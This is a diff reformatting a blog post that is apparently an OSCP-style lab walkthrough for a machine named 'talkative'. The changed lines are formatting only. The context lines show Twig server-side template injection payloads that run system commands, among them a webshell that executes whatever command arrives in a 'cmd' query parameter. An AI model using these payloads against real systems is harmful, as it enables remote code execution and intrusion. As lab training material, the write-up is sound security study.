@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "talkative"
-date: 2025-10-13 
+date: 2025-10-13
 categories: OSCP Playlist
 ---
 # talkative
@@ -240,13 +240,13 @@ Now we search for twig, we find the RCE command in **Out of Band Template Inject
 
 Let’s change the command to id to verify:
 
-```bash
+{% highlight bash %}
 {{['id']|filter('system')}}
 
 OR WEBSHELL
 
 {{app.request.query.filter('cmd',0,1024,{'options':'system'})}}
-```
+{% endhighlight %}
 
 Save changes, and clear the cache, go back to the main page. Searching for id, we find:
 
